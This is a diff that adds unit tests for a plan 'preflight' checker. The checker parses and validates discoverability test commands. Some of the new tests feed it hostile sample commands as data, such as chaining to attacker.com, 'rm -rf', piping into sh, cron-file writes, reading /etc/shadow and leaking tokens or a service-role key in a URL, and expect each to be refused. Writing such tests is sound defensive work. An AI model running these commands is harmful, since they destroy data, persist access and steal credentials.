@@ -43,6 +43,28 @@ describe("preflight Check 10 — SKILL.md prose invariants", () => {
     expect(matches!.length).toBeGreaterThanOrEqual(2);
   });
 
+  test("triple-SSOT: preflight + deepen-plan literals are byte-identical (whitespace-normalized)", () => {
+    const deepenPath = join(
+      import.meta.dir,
+      "..",
+      "skills",
+      "deepen-plan",
+      "SKILL.md",
+    );
+    const deepen = readFileSync(deepenPath, { encoding: "utf8" });
+    const extract = (src: string): string | null => {
+      const m = src.match(
+        /SENSITIVE_PATH_RE='\^\(apps\/web-platform[^\n]+/,
+      );
+      return m ? m[0].replace(/^[\s]+/, "") : null;
+    };
+    const a = extract(skill);
+    const b = extract(deepen);
+    expect(a).not.toBeNull();
+    expect(b).not.toBeNull();
+    expect(a).toBe(b);
+  });
+
   test("Shared Plan-File Resolution sub-section referenced from ≥3 places (header + 2 callers)", () => {
     const count = (skill.match(/Shared Plan-File Resolution/g) ?? []).length;
     expect(count).toBeGreaterThanOrEqual(3);
@@ -146,6 +168,19 @@ describe("parseExpected", () => {
     expect(expected).toMatch(/200/);
     expect(expected).toMatch(/401/);
   });
+
+  test("Form B — bold-wrapped `**Expected output:**` line", () => {
+    const block = [
+      "## Observability",
+      "",
+      "- **discoverability_test.command:**",
+      "  ```bash",
+      "  curl -fsS https://app.soleur.ai/api/inngest",
+      "  ```",
+      "  **Expected output:** `200`",
+    ].join("\n");
+    expect(parseExpected(block)).toMatch(/200/);
+  });
 });
 
 describe("matchExpected", () => {
@@ -170,6 +205,17 @@ describe("matchExpected", () => {
 
   test("rejects empty stdout against non-empty expected", () => {
     expect(matchExpected("200", "")).toBe(false);
+  });
+
+  test("short-token guard: expected '0' does NOT match 500/404/200/302", () => {
+    // Without the guard, "0" would substring-match every HTTP code containing
+    // a 0 digit, silently disabling the gate. Short tokens require exact match.
+    expect(matchExpected("0", "500\n")).toBe(false);
+    expect(matchExpected("0", "404")).toBe(false);
+    expect(matchExpected("0", "200")).toBe(false);
+    expect(matchExpected("0", "302")).toBe(false);
+    // Exact match still passes.
+    expect(matchExpected("0", "0\n")).toBe(true);
   });
 });
 
@@ -290,6 +336,63 @@ describe("classifyDiscoverabilityResult — defense-in-depth rejects", () => {
     expect(result.reason).toMatch(/ssh/i);
   });
 
+  test("rejects shell-chaining tokens (;, &&, ||, |) as FAIL", async () => {
+    const cases = [
+      "curl https://app.soleur.ai/health; curl https://attacker.com",
+      "curl https://app.soleur.ai/health && rm -rf /tmp/x",
+      "curl https://app.soleur.ai/health || curl https://attacker.com",
+      "curl https://app.soleur.ai/health | sh",
+      "curl https://app.soleur.ai/health > /etc/cron.d/x",
+      "curl https://app.soleur.ai/health < /etc/shadow",
+      "curl https://app.soleur.ai/health &",
+    ];
+    for (const cmd of cases) {
+      const planBody = [
+        "## Observability",
+        "",
+        "```yaml",
+        "discoverability_test:",
+        `  command: ${cmd}`,
+        '  expected_output: "200"',
+        "```",
+      ].join("\n");
+      const result = await classifyDiscoverabilityResult({
+        planPath: "fixtures/synthetic-chain.md",
+        planBody,
+        prBody: "knowledge-base/project/plans/fixtures/synthetic-chain.md",
+        runner: stubExecutor(0, "200\n"),
+      });
+      expect(result.result).toBe("FAIL");
+      expect(result.reason).toMatch(/shell-active|substitution|refusing/i);
+    }
+  });
+
+  test("rejects parameter-expansion ($VAR, ${VAR}) as FAIL", async () => {
+    const cases = [
+      "curl https://app.soleur.ai/?leak=$TOKEN",
+      "curl https://app.soleur.ai/?leak=${SUPABASE_SERVICE_ROLE_KEY}",
+    ];
+    for (const cmd of cases) {
+      const planBody = [
+        "## Observability",
+        "",
+        "```yaml",
+        "discoverability_test:",
+        `  command: ${cmd}`,
+        '  expected_output: "200"',
+        "```",
+      ].join("\n");
+      const result = await classifyDiscoverabilityResult({
+        planPath: "fixtures/synthetic-paramexp.md",
+        planBody,
+        prBody: "knowledge-base/project/plans/fixtures/synthetic-paramexp.md",
+        runner: stubExecutor(0, "200\n"),
+      });
+      expect(result.result).toBe("FAIL");
+      expect(result.reason).toMatch(/shell-active|refusing/i);
+    }
+  });
+
   test("rejects command-substitution as FAIL", async () => {
     const planBody = [
       "## Observability",
@@ -317,6 +420,19 @@ describe("Regression: PR #4148 DNS-fail fixture", () => {
     expect(body).toMatch(/web-platform\.soleur\.ai/);
   });
 
+  test("parser extracts the typo'd hostname from Form B fence (catches comment-strip bug)", () => {
+    // PR #4148's plan starts the Form B fence with `# Run from operator…`
+    // comment. If the parser does NOT strip leading `#` comments, the first
+    // executable line (the curl) becomes the SECOND fence line, and the
+    // command extracted is the comment text — production bash would exec a
+    // no-op comment instead of the typo'd curl.
+    const block = extractObservabilityBlock(fx("04-dns-fail.md"));
+    const cmd = parseCommand(block);
+    expect(cmd).toMatch(/^curl/);
+    expect(cmd).toMatch(/web-platform\.soleur\.ai/);
+    expect(cmd).not.toMatch(/^# /);
+  });
+
   test("classifier returns FAIL with DNS reason when stub executor returns (rc=6, stdout='')", async () => {
     const planBody = fx("04-dns-fail.md");
     const result = await classifyDiscoverabilityResult({
@@ -327,5 +443,27 @@ describe("Regression: PR #4148 DNS-fail fixture", () => {
     });
     expect(result.result).toBe("FAIL");
     expect(result.reason).toMatch(/DNS|resolve|hostname/i);
+  });
+});
+
+describe("Edge cases discovered in review", () => {
+  test("empty Form A block scalar (`command: |` with no continuation) returns empty", () => {
+    const block = ["discoverability_test:", "  command: |", ""].join("\n");
+    expect(parseCommand(block)).toBe("");
+  });
+
+  test("Form B fence with leading `# comment` lines strips comments and keeps real command", () => {
+    const block = [
+      "## Observability",
+      "",
+      "- **discoverability_test.command:**",
+      "  ```bash",
+      "  # Run from operator workstation (NO SSH).",
+      "  curl -fsS https://app.soleur.ai/api/inngest",
+      "  ```",
+      "  Expected output: `200`",
+    ].join("\n");
+    expect(parseCommand(block)).toMatch(/^curl/);
+    expect(parseCommand(block)).not.toMatch(/^#/);
   });
 });
